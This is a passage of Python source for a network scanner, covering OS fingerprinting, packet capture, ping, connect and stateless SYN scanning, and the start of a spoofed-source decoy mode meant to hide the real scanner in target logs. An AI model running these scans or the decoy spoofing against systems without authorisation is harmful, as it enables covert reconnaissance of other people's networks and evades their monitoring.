        opt_bytes    = data[ihl+20: ihl+tcp_data_off]
        opts: List[str] = []
        i = 0
        while i < len(opt_bytes):
            kind = opt_bytes[i]
            if kind == 0:   break                   # EOL
            if kind == 1:   opts.append("NOP"); i += 1; continue
            if i + 1 >= len(opt_bytes): break
            length = opt_bytes[i+1]
            if   kind == 2: opts.append("MSS")
            elif kind == 3: opts.append("WS")
            elif kind == 4: opts.append("SACK")
            elif kind == 8: opts.append("TS")
            i += max(2, length)
        return ",".join(opts)

    def _extract_window_scale(self, data: bytes, ihl: int) -> int:
        """Return window scale value, or -1 if not present."""
        tcp_data_off = (data[ihl+12] >> 4) * 4
        opt_bytes    = data[ihl+20: ihl+tcp_data_off]
        i = 0
        while i < len(opt_bytes):
            kind = opt_bytes[i]
            if kind == 0: break
            if kind == 1: i += 1; continue
            if i + 1 >= len(opt_bytes): break
            length = opt_bytes[i+1]
            if kind == 3 and length == 3 and i + 2 < len(opt_bytes):
                return opt_bytes[i+2]
            i += max(2, length)
        return -1

    def _classify_isn(self, isns: List[int]) -> str:
        if len(isns) < 2:
            return "unknown"
        diffs = [abs(isns[i+1] - isns[i]) for i in range(len(isns)-1)]
        avg   = sum(diffs) / len(diffs)
        if avg == 0:          return "constant"
        if avg < 500:         return "incremental"   # small fixed steps
        if avg < 5_000_000:   return "time-based"    # timer-based ISN
        return "random"

    def _classify_ipid(self, ipids: List[int]) -> str:
        if len(ipids) < 2:
            return "unknown"
        if all(x == 0 for x in ipids):
            return "zero"
        diffs = [abs(ipids[i+1] - ipids[i]) for i in range(len(ipids)-1)]
        avg   = sum(diffs) / len(diffs)
        if avg < 10:    return "incremental"
        if avg > 30000: return "random"
        return "random-increment"

    def _score_profiles(self, obs: OsProbeResult) -> str:
        """Score observations against 15-profile extended OS database."""
        # Extended profile: (name, isn, ipid, ts_present, ecn, win_scale_range)
        EXTENDED_PROFILES = [
            # Linux 5.x / 6.x
            ("Linux 5.x/6.x",     "random",      "random",      True,  True,  (7,  10)),
            # Linux 3.x / 4.x
            ("Linux 3.x/4.x",     "random",      "random",      True,  True,  (6,  9)),
            # Linux 2.6
            ("Linux 2.6",         "random",      "random",      True,  False, (5,  8)),
            # macOS 12+ (Monterey/Ventura)
            ("macOS 12+",         "random",      "random",      True,  True,  (6,  8)),
            # macOS 10.x / 11
            ("macOS 10.x/11",     "random",      "zero",        True,  False, (4,  6)),
            # Windows 11
            ("Windows 11",        "random",      "incremental", True,  True,  (8,  8)),
            # Windows 10
            ("Windows 10",        "random",      "incremental", True,  False, (8,  8)),
            # Windows Server 2019/2022
            ("Windows Server 2019+","random",    "incremental", True,  False, (8,  8)),
            # Windows 7/8
            ("Windows 7/8",       "time-based",  "incremental", False, False, (0,  0)),
            # FreeBSD 13+
            ("FreeBSD 13+",       "random",      "random",      True,  True,  (6,  7)),
            # OpenBSD 7+
            ("OpenBSD 7+",        "random",      "random",      True,  False, (3,  5)),
            # Cisco IOS 15+
            ("Cisco IOS",         "incremental", "incremental", False, False, (0,  0)),
            # Cisco IOS-XE
            ("Cisco IOS-XE",      "random",      "incremental", False, False, (0,  0)),
            # Solaris 11
            ("Solaris 11",        "random",      "incremental", True,  False, (4,  6)),
            # Embedded / IoT (VxWorks / RTOS)
            ("Embedded/IoT",      "constant",    "incremental", False, False, (0,  0)),
        ]

        scores: Dict[str, float] = {}
        for (name, isn, ipid, ts, ecn, ws_range) in EXTENDED_PROFILES:
            score = 0.0
            if obs.isn_class  == isn:  score += 3.0
            if obs.ipid_class == ipid: score += 2.0
            if obs.ts_option  == ts:   score += 1.0
            if obs.ecn_support == ecn: score += 1.5
            ws_lo, ws_hi = ws_range
            if ws_lo <= obs.win_scale <= ws_hi and ws_hi > 0:
                score += 2.0
            scores[name] = score

        if not scores or max(scores.values()) < 1.0:
            return "Unknown"

        best = max(scores, key=lambda k: scores[k])
        sc   = scores[best]
        max_possible = 3.0 + 2.0 + 1.0 + 1.5 + 2.0
        pct  = int(sc / max_possible * 100)
        conf = "high" if pct >= 65 else "medium" if pct >= 40 else "low"
        return f"{best} (confidence: {conf}, score: {sc:.1f})"


# ═══════════════════════════════════════════════════════════════════
# [V9-1] BPF / LIBPCAP PACKET CAPTURE ENGINE
# ═══════════════════════════════════════════════════════════════════
# Uses ctypes to call libpcap directly — no third-party packages.
# Provides a drop-in replacement for raw socket recv that:
#   • Applies a kernel-level BPF filter (far fewer false positives)
#   • Returns Ethernet-stripped IP packets, same format as raw socket
#   • Falls back silently to raw socket if libpcap is absent

import ctypes
import ctypes.util
import select as _select_mod

# Try to load libpcap
_libpcap: Any = None
_PCAP_LIB_NAME = ctypes.util.find_library("pcap")
if _PCAP_LIB_NAME:
    try:
        _libpcap = ctypes.CDLL(_PCAP_LIB_NAME)
        # Declare minimal signatures
        _libpcap.pcap_open_live.restype  = ctypes.c_void_p
        _libpcap.pcap_open_live.argtypes = [
            ctypes.c_char_p,   # device
            ctypes.c_int,      # snaplen
            ctypes.c_int,      # promisc
            ctypes.c_int,      # to_ms
            ctypes.c_char_p,   # errbuf
        ]
        _libpcap.pcap_compile.restype  = ctypes.c_int
        _libpcap.pcap_compile.argtypes = [
            ctypes.c_void_p,
            ctypes.c_void_p,   # bpf_program*
            ctypes.c_char_p,   # filter_exp
            ctypes.c_int,      # optimize
            ctypes.c_uint32,   # netmask
        ]
        _libpcap.pcap_setfilter.restype  = ctypes.c_int
        _libpcap.pcap_setfilter.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
        _libpcap.pcap_next_ex.restype  = ctypes.c_int
        _libpcap.pcap_next_ex.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_void_p),
        ]
        _libpcap.pcap_close.restype  = None
        _libpcap.pcap_close.argtypes = [ctypes.c_void_p]
        _libpcap.pcap_freecode.restype  = None
        _libpcap.pcap_freecode.argtypes = [ctypes.c_void_p]
        _libpcap.pcap_datalink.restype  = ctypes.c_int
        _libpcap.pcap_datalink.argtypes = [ctypes.c_void_p]
        _libpcap.pcap_get_selectable_fd.restype  = ctypes.c_int
        _libpcap.pcap_get_selectable_fd.argtypes = [ctypes.c_void_p]
    except Exception:
        _libpcap = None

HAS_LIBPCAP: bool = _libpcap is not None


# BPF program struct (8-byte instructions × N)
class _BpfProgram(ctypes.Structure):
    _fields_ = [("bf_len", ctypes.c_uint),
                 ("bf_insns", ctypes.c_void_p)]


class PacketCapture:
    """
    [V9-1] Thin ctypes wrapper around libpcap for kernel-level BPF filtering.

    Usage:
        cap = PacketCapture(iface="eth0", bpf_filter="tcp and host 192.168.1.1")
        with cap:
            while True:
                pkt = cap.next_packet(timeout=1.0)  # returns IP-layer bytes or None

    Falls back to raw socket mode if libpcap is not available, providing
    the same interface so callers need no special-casing.
    """

    DLT_EN10MB = 1    # Ethernet
    DLT_RAW    = 101  # Raw IP
    DLT_LINUX_SLL = 113  # Linux cooked

    def __init__(self, dst_ip: str = "",
                 bpf_filter: str = "",
                 snaplen: int = 65535,
                 promisc: int = 0,
                 timeout_ms: int = 100):
        self.dst_ip     = dst_ip
        self.snaplen    = snaplen
        self.promisc    = promisc
        self.timeout_ms = timeout_ms
        self._handle: Any = None
        self._raw_sock: Optional[socket.socket] = None
        self._datalink  = self.DLT_EN10MB
        self._use_pcap  = False
        self._errbuf    = ctypes.create_string_buffer(256)

        # Build filter string
        self._filter = bpf_filter or (
            f"tcp and host {dst_ip}" if dst_ip else "tcp")

    def open(self, iface: str = "") -> bool:
        """
        Open capture. Returns True if libpcap available and opened,
        False if falling back to raw socket.
        """
        if _libpcap is not None:
            # Detect default interface if not given
            dev = iface.encode() if iface else self._detect_iface()
            handle = _libpcap.pcap_open_live(
                dev, self.snaplen, self.promisc,
                self.timeout_ms, self._errbuf)
            if handle:
                self._handle   = handle
                self._datalink = _libpcap.pcap_datalink(handle)
                self._apply_filter()
                self._use_pcap = True
                return True

        # Fallback: raw socket
        try:
            self._raw_sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self._raw_sock.setsockopt(
                socket.SOL_SOCKET, socket.SO_RCVBUF, 8 * 1024 * 1024)
            self._raw_sock.setblocking(False)
        except (PermissionError, OSError):
            self._raw_sock = None
        return False

    def _detect_iface(self) -> bytes:
        """Return default network interface name as bytes."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            iface = s.getsockname()[0]
            s.close()
            # Try to find interface name from IP
            import subprocess as _sp
            result = _sp.run(["ip", "-o", "-4", "addr"],
                              capture_output=True, text=True, timeout=2)
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 4 and iface in parts[3]:
                    return parts[1].encode()
        except Exception:
            pass
        return b"eth0"

    def _apply_filter(self) -> None:
        """Compile and apply BPF filter to pcap handle."""
        if not self._handle or not self._filter:
            return
        prog = _BpfProgram()
        ret = _libpcap.pcap_compile(
            self._handle,
            ctypes.byref(prog),
            self._filter.encode(),
            1,       # optimize
            0xFFFFFFFF,  # netmask (PCAP_NETMASK_UNKNOWN)
        )
        if ret == 0:
            _libpcap.pcap_setfilter(self._handle, ctypes.byref(prog))
            _libpcap.pcap_freecode(ctypes.byref(prog))

    def next_packet(self, timeout: float = 1.0) -> Optional[bytes]:
        """
        Return the next IP-layer bytes (strips Ethernet/SLL header).
        Returns None on timeout or error.
        """
        if self._use_pcap and self._handle:
            return self._next_pcap(timeout)
        elif self._raw_sock:
            return self._next_raw(timeout)
        return None

    def _next_pcap(self, timeout: float) -> Optional[bytes]:
        """Read one packet from pcap handle, strip datalink header."""
        hdr_ptr  = ctypes.c_void_p()
        data_ptr = ctypes.c_void_p()
        ret = _libpcap.pcap_next_ex(
            self._handle,
            ctypes.byref(hdr_ptr),
            ctypes.byref(data_ptr))
        if ret == 1 and data_ptr:
            # Read caplen from pcap_pkthdr: u_int ts.tv_sec, ts.tv_usec, caplen, len
            caplen = ctypes.cast(hdr_ptr,
                ctypes.POINTER(ctypes.c_uint * 4))[0][2]
            raw = bytes(ctypes.cast(data_ptr,
                ctypes.POINTER(ctypes.c_ubyte * caplen))[0])
            return self._strip_datalink(raw)
        return None

    def _next_raw(self, timeout: float) -> Optional[bytes]:
        """Read from raw socket using select for timeout."""
        try:
            r, _, _ = _select_mod.select([self._raw_sock], [], [], timeout)
            if r:
                return self._raw_sock.recv(65535)
        except Exception:
            pass
        return None

    def _strip_datalink(self, raw: bytes) -> bytes:
        """Strip datalink-layer header to expose raw IP packet."""
        if self._datalink == self.DLT_EN10MB:
            return raw[14:] if len(raw) > 14 else raw  # Ethernet header = 14
        if self._datalink == self.DLT_LINUX_SLL:
            return raw[16:] if len(raw) > 16 else raw  # Linux cooked = 16
        return raw  # DLT_RAW: already IP

    def fileno(self) -> int:
        """Return selectable fd (for use with epoll/select)."""
        if self._use_pcap and self._handle:
            fd = _libpcap.pcap_get_selectable_fd(self._handle)
            if fd >= 0:
                return fd
        if self._raw_sock:
            return self._raw_sock.fileno()
        return -1

    def close(self) -> None:
        if self._use_pcap and self._handle:
            _libpcap.pcap_close(self._handle)
            self._handle = None
        if self._raw_sock:
            try: self._raw_sock.close()
            except Exception: pass
            self._raw_sock = None

    def __enter__(self) -> "PacketCapture":
        self.open()
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()


# ═══════════════════════════════════════════════════════════════════
# [V9-4] EPOLL / SELECT RECEIVE LOOP
# ═══════════════════════════════════════════════════════════════════

class _EpollReceiver:
    """
    [V9-4] Non-blocking packet receiver using epoll (Linux) or select
    (cross-platform fallback).

    Replaces the blocking recvfrom() loop in syn_batch_scan with a
    batch-drain loop: after epoll signals readability, all available
    packets are read in a tight non-blocking loop before returning to
    epoll_wait. This halves context-switch overhead on fast networks.
    """

    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._epoll: Any = None
        self._use_epoll = False
        sock.setblocking(False)
        # Try epoll first (Linux only)
        if hasattr(_select_mod, "epoll"):
            try:
                self._epoll = _select_mod.epoll()
                self._epoll.register(sock.fileno(), _select_mod.EPOLLIN)
                self._use_epoll = True
            except Exception:
                self._epoll = None

    def recv_packets(self, timeout: float,
                     bufsize: int = 65535) -> List[bytes]:
        """
        Block up to `timeout` seconds, then batch-drain all available
        packets from the socket. Returns a list of raw packet bytes.
        """
        packets: List[bytes] = []
        deadline = time.time() + timeout

        while time.time() < deadline:
            remaining = max(0.01, deadline - time.time())

            if self._use_epoll and self._epoll:
                try:
                    events = self._epoll.poll(min(remaining, 0.1))
                    if not events:
                        continue
                except Exception:
                    break
            else:
                # select() fallback
                try:
                    r, _, _ = _select_mod.select(
                        [self._sock], [], [], min(remaining, 0.1))
                    if not r:
                        continue
                except Exception:
                    break

            # Batch-drain: read all available packets non-blocking
            while True:
                try:
                    data = self._sock.recv(bufsize)
                    if data:
                        packets.append(data)
                except BlockingIOError:
                    break   # no more packets right now
                except Exception:
                    return packets
            break   # one drain pass per epoll event (avoid starvation)

        return packets

    def close(self) -> None:
        if self._epoll:
            try: self._epoll.close()
            except Exception: pass


# ─────────────────────────────────────────────
# Internet checksum
# ─────────────────────────────────────────────

def checksum(data: bytes) -> int:
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += data[i] + (data[i + 1] << 8)
    if n:
        s += data[-1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


# ─────────────────────────────────────────────
# [FIX-5] ICMP Ping
# ─────────────────────────────────────────────

def icmp_ping(ip: str, timeout: float = 1.5) -> Tuple[bool, float, int]:
    """
    Send ICMP echo requests. Returns (reachable, latency_ms, ttl).
    [FIX-5]  On PermissionError falls back immediately to TCP ping.
    [FIX-31] Retransmits up to ICMP_MAX_PROBES times before declaring
             host down — one dropped probe no longer marks a host as down.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                             socket.IPPROTO_ICMP)
        sock.settimeout(timeout)
    except PermissionError:
        return _tcp_ping(ip, timeout)
    except OSError:
        return _tcp_ping(ip, timeout)

    pid = os.getpid() & 0xFFFF

    try:
        for attempt in range(ICMP_MAX_PROBES):   # [FIX-31] retry loop
            seq  = random.randint(0, 0xFFFF)
            hdr  = struct.pack("!BBHHH", 8, 0, 0, pid, seq)
            payload = b"PyScanner-ping"
            chk  = checksum(hdr + payload)
            hdr  = struct.pack("!BBHHH", 8, 0, chk, pid, seq)
            pkt  = hdr + payload

            t0       = time.time()
            deadline = t0 + timeout
            sock.sendto(pkt, (ip, 0))

            while time.time() < deadline:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                sock.settimeout(remaining)
                try:
                    raw, addr = sock.recvfrom(1024)
                    if addr[0] == ip:
                        # Verify ICMP echo reply (type=0) and matching seq
                        ip_hdr_len = (raw[0] & 0x0F) * 4
                        if len(raw) >= ip_hdr_len + 8:
                            icmp_type = raw[ip_hdr_len]
                            recv_seq  = struct.unpack(
                                "!H", raw[ip_hdr_len + 6: ip_hdr_len + 8])[0]
                            if icmp_type == 0 and recv_seq == seq:
                                ttl = raw[8]
                                lat = (time.time() - t0) * 1000
                                return True, round(lat, 2), ttl
                except socket.timeout:
                    break   # this probe timed out; try again
    except Exception:
        pass
    finally:
        sock.close()
    return False, 0.0, 0


def _tcp_ping(ip: str, timeout: float = 1.0) -> Tuple[bool, float, int]:
    """
    TCP connect as ping fallback (no root required).
    [FIX-12] Handles ECONNREFUSED portably across Linux/Windows/macOS.
    """
    for port in (80, 443, 22, 8080, 23):
        t0 = time.time()
        s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            code = s.connect_ex((ip, port))
            lat  = (time.time() - t0) * 1000
            # [FIX-12] 0=connected, 111=Linux ECONNREFUSED, 10061=Windows, 61=macOS
            if code == 0 or code in (111, 10061, 61):
                return True, round(lat, 2), 0
        except ConnectionRefusedError:
            lat = (time.time() - t0) * 1000
            return True, round(lat, 2), 0
        except Exception:
            pass
        finally:
            s.close()
    return False, 0.0, 0


# ─────────────────────────────────────────────
# TCP Connect Scan
# ─────────────────────────────────────────────

def tcp_connect_scan(ip: str, port: int, timeout: float) -> PortResult:
    """[FIX-27] Supports both IPv4 and IPv6 targets."""
    result = PortResult(port=port, protocol="tcp")
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    s = socket.socket(family, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        code = s.connect_ex((ip, port))
        if code == 0:
            result.state   = "open"
            result.service = service_name(port)
            result.reason  = "syn-ack"
        elif code in (111, 10061, 61):
            # [FIX-12] Platform-portable ECONNREFUSED check
            result.state  = "closed"
            result.reason = "reset"
        else:
            result.state  = "filtered"
            result.reason = f"errno-{code}"
    except ConnectionRefusedError:
        result.state  = "closed"
        result.reason = "reset"
    except socket.timeout:
        result.state  = "filtered"
        result.reason = "timeout"
    except Exception as exc:
        result.state  = "filtered"
        result.reason = str(exc)
    finally:
        s.close()
    return result


# ═══════════════════════════════════════════════════════════════════
# [ENH-8] STATELESS SCANNING ENGINE  (ZMap / Masscan architecture)
# ═══════════════════════════════════════════════════════════════════
#
# Traditional scanners store a probe_map table:
#
#     probe_map[src_port] = (dst_port, seq)
#
# This creates a memory footprint that grows linearly with probes:
#     1k hosts   → tiny
#     1M hosts   → gigabytes
#     Internet   → impossible
#
# Stateless scanning encodes (dst_ip, dst_port) directly into the
# TCP ISN (Initial Sequence Number) using a keyed hash.  When a
# SYN-ACK arrives, the ACK field = ISN+1, so:
#
#     ack_num - 1 = original ISN = hash(secret, ip, port)
#
# We verify the ISN matches what we would have generated, which also
# provides basic spoofing resistance.  The state table is eliminated
# entirely; memory usage is O(1) regardless of scan size.
#
# This is exactly how ZMap (2013) and Masscan work.
# ═══════════════════════════════════════════════════════════════════

import hmac as _hmac
import hashlib as _hashlib

# Module-level 16-byte secret, re-randomised each process start.
# Provides SYN-cookie-style validation of incoming SYN-ACKs.
_STATELESS_SECRET: bytes = os.urandom(16)

# Fixed ephemeral src port used in stateless mode — we use a single
# well-known port and rely entirely on the ISN for demultiplexing.
_STATELESS_SRC_PORT: int = 61000


def _stateless_isn(secret: bytes, dst_ip: str, dst_port: int) -> int:
    """
    [ENH-8] Compute a 32-bit ISN encoding (dst_ip, dst_port).

    Uses HMAC-SHA256 keyed with the per-process secret so:
      • Replies from non-probed (ip, port) pairs are silently dropped.
      • An attacker who does not know the secret cannot forge valid replies.

    Algorithm:
        key  = secret
        data = inet_aton(dst_ip) || u16be(dst_port)
        isn  = first 4 bytes of HMAC-SHA256(key, data)
    """
    data = socket.inet_aton(dst_ip) + struct.pack("!H", dst_port)
    h    = _hmac.new(secret, data, _hashlib.sha256).digest()
    return struct.unpack("!I", h[:4])[0]


def _stateless_verify(secret: bytes, dst_ip: str,
                       ack_minus_one: int) -> Optional[int]:
    """
    [ENH-8] Given the ack_num from an incoming SYN-ACK, determine whether
    it matches any port in [1, 65535] for this destination IP.

    We cannot do this in O(1) without a lookup table because the ISN
    embeds both ip AND port — we need to try all 65535 ports to find
    which one generated this ISN.  In practice we only scan a small
    port list, so we pass that list explicitly.

    Returns the matched dst_port or None.
    """
    # Caller must use _stateless_recover_port() with the actual port list.
    return None


def _stateless_recover_port(secret: bytes, dst_ip: str,
                              ack_num: int,
                              candidate_ports: List[int]) -> Optional[int]:
    """
    [ENH-8] Recover dst_port from a SYN-ACK ack_num field.

    ack_num in SYN-ACK = our_isn + 1
    So our_isn = ack_num - 1

    We check each candidate port to see which one produces this ISN.
    O(n) in the number of scanned ports — but that set is fixed and small
    compared to total packets; this runs only on actual SYN-ACK / RST
    replies (rare), not on every probe sent.
    """
    target_isn = (ack_num - 1) & 0xFFFFFFFF
    for port in candidate_ports:
        if _stateless_isn(secret, dst_ip, port) == target_isn:
            return port
    return None


def stateless_syn_scan(ip: str, ports: List[int],
                        timeout: float,
                        secret: bytes = _STATELESS_SECRET,
                        ) -> Dict[int, PortResult]:
    """
    [ENH-8] Stateless SYN scan — ZMap / Masscan architecture.

    Key differences from syn_batch_scan():
      • No probe_map state table — ISN encodes (ip, port)
      • Single fixed src_port (_STATELESS_SRC_PORT) — no ephemeral alloc
      • Memory usage is O(1) regardless of port list size
      • SYN-ACK validation via HMAC prevents spoofed-reply pollution
      • Suitable for scanning millions of (ip, port) pairs

    Packet flow:
        send:  SYN to (ip, port) with seq = HMAC(secret, ip||port)
        recv:  SYN-ACK with ack = seq+1  → recover port from ack-1
               RST with seq   → treat as closed (port recovery same way)

    Returns {port: PortResult}.
    Falls back to syn_batch_scan() if raw sockets unavailable.
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }
    if not ports:
        return results

    # IPv6 stateless scan delegates to stateless_syn_scan_v6
    if is_ipv6(ip):
        return stateless_syn_scan_v6(ip, ports, timeout, secret)

    src_ip = get_local_ip(ip)

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             8 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        return syn_batch_scan(ip, ports, timeout)

    port_set = set(ports)
    seen:    set = set()

    try:
        # ── Send phase: stateless burst ──────────────────────────────
        for dst_port in ports:
            isn = _stateless_isn(secret, ip, dst_port)
            pkt = _build_syn_packet(src_ip, ip,
                                    _STATELESS_SRC_PORT, dst_port, isn)
            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip, 0))
            except OSError:
                pass

        # ── Receive phase: decode state from ISN ─────────────────────
        deadline = time.time() + timeout
        while time.time() < deadline and len(seen) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

            if addr[0] != ip or len(data) < 40:
                continue
            if data[9] != socket.IPPROTO_TCP:
                continue

            ihl   = (data[0] & 0x0F) * 4
            if len(data) < ihl + 20:
                continue

            tcp_src = struct.unpack("!H", data[ihl:     ihl+2])[0]
            tcp_dst = struct.unpack("!H", data[ihl+2:   ihl+4])[0]
            flags   = data[ihl + 13]
            ack_num = struct.unpack("!I", data[ihl+8:   ihl+12])[0]
            seq_num = struct.unpack("!I", data[ihl+4:   ihl+8])[0]

            # Only accept replies destined to our stateless src port
            if tcp_dst != _STATELESS_SRC_PORT:
                continue

            # [ENH-8] Recover dst_port from the ack field
            if flags & 0x12:    # SYN-ACK
                dst_port = _stateless_recover_port(
                    secret, ip, ack_num, ports)
                if dst_port is None:
                    continue    # Not our probe — drop (anti-spoof)
                r = results[dst_port]
                r.state   = "open"
                r.reason  = "syn-ack"
                r.service = service_name(dst_port)

                # Fingerprinting signals
                tcp_win = struct.unpack("!H", data[ihl+14:ihl+16])[0]
                df      = bool(struct.unpack("!H", data[6:8])[0] & 0x4000)
                has_opt = (data[ihl+12] >> 4) * 4 > 20
                r._fp_tcp_window      = tcp_win
                r._fp_df_bit          = df
                r._fp_has_tcp_options = has_opt

                # Send RST to avoid half-open connections
                _send_rst(src_ip, ip, _STATELESS_SRC_PORT,
                           dst_port, seq_num + 1)
                seen.add(dst_port)

            elif flags & 0x04:  # RST
                # RST ack encodes port the same way
                dst_port = _stateless_recover_port(
                    secret, ip, ack_num, ports)
                if dst_port is None:
                    # RST seq may encode port differently — try seq
                    for p in ports:
                        if _stateless_isn(secret, ip, p) == seq_num:
                            dst_port = p
                            break
                if dst_port is not None and dst_port not in seen:
                    results[dst_port].state  = "closed"
                    results[dst_port].reason = "reset"
                    seen.add(dst_port)

        # ── Retransmit unanswered (same stateless logic) ──────────────
        for _retry in range(SYN_MAX_RETRIES - 1):
            unanswered = [p for p in ports if p not in seen]
            if not unanswered:
                break
            for dst_port in unanswered:
                isn = _stateless_isn(secret, ip, dst_port)
                pkt = _build_syn_packet(src_ip, ip,
                                        _STATELESS_SRC_PORT, dst_port, isn)
                if _RATE_LIMITER is not None:
                    _RATE_LIMITER.consume(1)
                try:
                    send_sock.sendto(pkt, (ip, 0))
                except OSError:
                    pass
            deadline = time.time() + timeout
            while time.time() < deadline and len(seen) < len(ports):
                try:
                    data, addr = recv_sock.recvfrom(4096)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if addr[0] != ip or len(data) < 40:
                    continue
                if data[9] != socket.IPPROTO_TCP:
                    continue
                ihl = (data[0] & 0x0F) * 4
                if len(data) < ihl + 20:
                    continue
                tcp_dst_r = struct.unpack("!H", data[ihl+2:ihl+4])[0]
                if tcp_dst_r != _STATELESS_SRC_PORT:
                    continue
                flags_r   = data[ihl+13]
                ack_num_r = struct.unpack("!I", data[ihl+8:ihl+12])[0]
                seq_num_r = struct.unpack("!I", data[ihl+4:ihl+8])[0]
                if flags_r & 0x12:
                    dp = _stateless_recover_port(secret, ip, ack_num_r, ports)
                    if dp and dp not in seen:
                        results[dp].state   = "open"
                        results[dp].reason  = "syn-ack"
                        results[dp].service = service_name(dp)
                        _send_rst(src_ip, ip, _STATELESS_SRC_PORT,
                                   dp, seq_num_r + 1)
                        seen.add(dp)
                elif flags_r & 0x04:
                    dp = _stateless_recover_port(secret, ip, ack_num_r, ports)
                    if dp is None:
                        for p in ports:
                            if _stateless_isn(secret, ip, p) == seq_num_r:
                                dp = p; break
                    if dp and dp not in seen:
                        results[dp].state  = "closed"
                        results[dp].reason = "reset"
                        seen.add(dp)

    finally:
        send_sock.close()
        recv_sock.close()

    return results


def stateless_syn_scan_v6(ip6: str, ports: List[int],
                            timeout: float,
                            secret: bytes = _STATELESS_SECRET,
                            ) -> Dict[int, PortResult]:
    """
    [ENH-8] Stateless SYN scan for IPv6.

    Architecture identical to stateless_syn_scan() but uses AF_INET6
    raw sockets and _build_syn_packet_v6() for packet construction.
    The ISN encoding is the same HMAC scheme — the secret is shared.
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }
    if not ports:
        return results

    # Get local IPv6 source address
    try:
        probe_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        probe_sock.connect((ip6, 80))
        src_ip6 = probe_sock.getsockname()[0]
        probe_sock.close()
    except OSError:
        return results

    try:
        send_sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             4 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        return syn_batch_scan_v6(ip6, ports, timeout)

    seen: set = set()

    try:
        for dst_port in ports:
            isn = _stateless_isn(secret, ip6, dst_port)
            pkt = _build_syn_packet_v6(src_ip6, ip6,
                                        _STATELESS_SRC_PORT, dst_port, isn)
            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip6, 0, 0, 0))
            except OSError:
                pass

        deadline = time.time() + timeout
        while time.time() < deadline and len(seen) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

            sender = addr[0]
            if sender.startswith("::ffff:"):
                sender = sender[7:]
            if sender != ip6:
                continue
            if len(data) < 20:
                continue

            # AF_INET6 SOCK_RAW delivers TCP segment directly
            tcp_dst = struct.unpack("!H", data[2:4])[0]
            flags   = data[13]
            ack_num = struct.unpack("!I", data[8:12])[0]
            seq_num = struct.unpack("!I", data[4:8])[0]

            if tcp_dst != _STATELESS_SRC_PORT:
                continue

            if flags & 0x12:
                dp = _stateless_recover_port(secret, ip6, ack_num, ports)
                if dp and dp not in seen:
                    results[dp].state   = "open"
                    results[dp].reason  = "syn-ack"
                    results[dp].service = service_name(dp)
                    seen.add(dp)
            elif flags & 0x04:
                dp = _stateless_recover_port(secret, ip6, ack_num, ports)
                if dp and dp not in seen:
                    results[dp].state  = "closed"
                    results[dp].reason = "reset"
                    seen.add(dp)

    finally:
        send_sock.close()
        recv_sock.close()

    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-9] DECOY SCANNING  (Nmap -D equivalent)
# ═══════════════════════════════════════════════════════════════════
#
# Each real SYN probe is preceded (or surrounded) by N spoofed SYN
# packets from randomly-generated or user-specified "decoy" IPs.
#
# Effect on the target:
#   - Target sees SYN floods from many apparent sources
#   - Log analysis shows N+1 scanners, not one
#   - Real scanner is buried in the noise
#
# Important constraints:
#   - Decoy packets are SENT from our machine (spoofed src IP)
#   - Only the REAL probe gets a reply (SYN-ACK goes to the real IP)
#   - Decoy IPs should be reachable (or at least plausible) or the
#     target may discard SYNs from obviously bogus IPs via uRPF
#   - Raw socket + IP_HDRINCL required (root only)
#
# This is exactly Nmap's -D ME,decoy1,decoy2,... mechanism.
# ═══════════════════════════════════════════════════════════════════

def _random_decoy_ip() -> str:
    """Generate a random globally-routable IPv4 decoy address."""
    while True:
        a = random.randint(1, 254)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        # Skip RFC1918 private, loopback, multicast, link-local, documentation
        if a == 10:                                         continue
        if a == 172 and 16 <= b <= 31:                     continue
        if a == 192 and b == 168:                          continue
        if a == 127:                                        continue
        if a >= 224:                                        continue  # multicast+
        if a == 169 and b == 254:                          continue  # link-local
        if a == 192 and b == 0 and c == 2:                 continue  # TEST-NET-1
